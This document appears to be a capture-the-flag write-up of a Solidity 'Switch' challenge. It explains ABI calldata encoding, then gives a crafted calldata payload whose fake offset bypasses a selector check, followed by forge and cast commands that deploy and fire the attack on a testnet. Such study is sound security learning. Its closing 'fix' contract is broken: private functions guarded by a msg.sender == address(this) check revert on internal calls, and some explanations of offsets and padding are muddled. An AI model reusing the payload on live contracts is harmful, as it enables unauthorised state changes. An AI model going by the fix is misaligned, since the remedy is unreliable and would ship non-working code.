# Switch

Just have to flip the switch. Can't be that hard, right?

## CALLDATA

`CALLDATA` is a read-only byte-addressable space where the data of a transaction or function call is stored in Ethereum smart contracts. It's used to encode function arguments that are sent along with a function call to a contract. Understanding calldata flow involves knowing how data is structured and passed to functions within the Ethereum Virtual Machine (EVM).

### How CALLDATA is encoded

1. `Function selector`: The first `4 bytes` of `CALLDATA` are reserved for the function selector. This is derived from the first 4 bytes of the Keccak-256 hash of the function signature (e.g., `transfer(address,uint256)`). The function selector is used by the EVM to determine which function to execute within the smart contract.

2. `Parameters encoding`: After the function selector, the parameters of the function call are encoded. Solidity uses the `Ethereum Contract ABI (Application Binary Interface)` specification for encoding these parameters.

3. `Fixed and Dynamic Types`: The Ethereum ABI differentiates between fixed-size types (like `uint256`, `address`, etc.) and dynamic types (like `bytes`, `string`, etc.). Fixed-size types are encoded directly in the calldata following the function selector. Dynamic types, however, are encoded differently to handle their variable size.

4. `Dynamic Types Encoding`:

   1. For dynamic types, the calldata includes an offset instead of the data itself immediately after the function selector and fixed-size arguments. This offset points to the location within the calldata where the actual data for the dynamic type starts.
   2. The actual data for a dynamic type begins with its length (for types like `bytes` and `string`) and is followed by the data itself. This length is necessary because the EVM needs to know how much data to read for these variable-length types.

5. `Padding`: The Ethereum ABI requires that all elements in the calldata are aligned to `32 bytes`. This means that if an argument does not naturally align to `32 bytes`, it must be `right-padded` with zeros. 

### calldatacopy

The `calldatacopy` instruction in Solidity's inline assembly is used to copy data from the call data to memory. The calldatacopy instruction is particularly useful for operations that require direct manipulation or inspection of the raw call data, which can be more gas-efficient in certain scenarios. Here's a breakdown of how calldatacopy works:

It's often used in low-level operations, such as when a contract needs to dynamically determine which function to call or when processing arbitrary-length data that doesn't fit neatly into Solidity's type system.

`calldatacopy` is a powerful tool for low-level manipulation of call data in Solidity contracts, enabling efficient data handling and custom processing scenarios. However, its use requires careful consideration of safety, complexity, and compatibility aspects.

- Syntax: calldatacopy(t, f, s)

    t (target): The starting position in memory where the data should be copied to.
    f (from): The starting position in the call data from where to begin copying.
    s (size): The number of bytes to copy from the call data to memory.

```bash
assembly {
    # copy 4 bytes from calldata at position 68 into the memory location starting at selector
    calldatacopy(selector, 68, 4) # grab function selector from calldata
}
```

The choice of position 68 assumes a specific layout of the call data, likely based on the structure of the transaction being sent to `flipSwitch`.

## Vulnerability

```bash
✗ cast sig "flipSwitch(bytes)"
0x30c13ade

cast sig "turnSwitchOff()"
0x20606e15

✗ cast sig "turnSwitchOn()"
0x76227e12
```
1. Function Selector for `flipSwitch(bytes memory data)`: `30c13ade`

This is the first 4 bytes of the calldata and is used to identify which function to call in the smart contract.

2. Offset for the data field: `0000000000000000000000000000000000000000000000000000000000000060`

This indicates the start of the data for the `bytes memory data` parameter. In Solidity, complex data types like `bytes` and `string` are passed by reference, with this part specifying the offset (in bytes) from the start of the calldata to where the data begins. The offset is `96 bytes` (`0x60` in hexadecimal), pointing to the location after the initial function selector and the length of the bytes array.

3. Padding to reach the `64-byte` offset: `0000000000000000000000000000000000000000000000000000000000000000`

This is used to align the next part of the calldata to a `64-byte` boundary, as per Solidity's convention for handling calldata.

4. Function selector for `turnSwitchOff()`: 20606e1500000000000000000000000000000000000000000000000000000000

This part is intended to mimic a legitimate call to `turnSwitchOff()` by including its function selector. The function selector is followed by padding to fill the rest of the `32-byte` slot.

5. Length of data field: `0000000000000000000000000000000000000000000000000000000000000004`

This specifies the length of the data being passed to the `flipSwitch` function. In this case, it indicates that the data is `4 bytes` long, which is incorrect given the actual length of the data provided. This is part of the crafted exploit.

6. Function selector for `turnSwitchOn()`: `76227e1200000000000000000000000000000000000000000000000000000000`

This is the actual data being passed to the `flipSwitch` function, intended to trigger a call to`turnSwitchOn()` by including its function selector. This part of the calldata is designed to exploit the contract by bypassing intended logic checks.

```bash
# Calldata layout (32-byte slots)
# 30c13ade                                                         -> function Selector for flipSwitch(bytes memory data)
# 0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field
# 0000000000000000000000000000000000000000000000000000000000000000 -> padding
# 20606e1500000000000000000000000000000000000000000000000000000000 -> function selector for turnSwitchOff()
# 0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
# 76227e1200000000000000000000000000000000000000000000000000000000 -> function selector for turnSwitchOn()
```

## Attack

1. Deploy `SwitchAttack`.

```bash
forge script script/DeploySwitchAttack.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy

# make deploy ARGS="--network sepolia"
# https://sepolia.etherscan.io/address/0x70aD9fB0D0e2d9C82Bcf4DB46E6BdD2Beb5c7157
```

3. Attack

```bash
cast send $CONTRACT_ADDRESS "attack()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy

# https://sepolia.etherscan.io/tx/0xf1235f7755a33fcde34225c518755fe83d873519f671f43e6a95bb9a2e521744
```

## Fix

1. `Use explicit function calls instead of dynamic calls`: Replace the dynamic call in `flipSwitch` with explicit function calls. This prevents an attacker from crafting calldata that bypasses the contract's intended logic.

2. `Strengthen the onlyOff modifier`: Ensure that the `onlyOff` modifier checks not just for the presence of a specific function selector but also validates the overall structure and intent of the call.

3. `Validate the entire calldata`: Instead of just checking a portion of the calldata, validate the entire calldata to ensure it matches expected patterns for legitimate use cases.

4. `Use a more secure way to manage contract state`: Instead of allowing any external call to change the state, restrict state changes to predefined functions that are protected by appropriate access control mechanisms.

```bash
contract Switch {
    bool public switchOn; // switch is off
    bytes4 private constant OFF_SELECTOR = bytes4(keccak256("turnSwitchOff()"));
    bytes4 private constant ON_SELECTOR = bytes4(keccak256("turnSwitchOn()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    # This modifier is no longer needed if we're not using dynamic calls
    # modifier onlyOff() {
    #     require(!switchOn, "Switch must be off");
    #     _;
    # }

    function flipSwitch(bool turnOn) public {
        require(!switchOn, "Switch must be off");
        if (turnOn) {
            turnSwitchOn();
        } else {
            turnSwitchOff();
        }
    }

    function turnSwitchOn() private onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() private onlyThis {
        switchOn = false;
    }
}
```
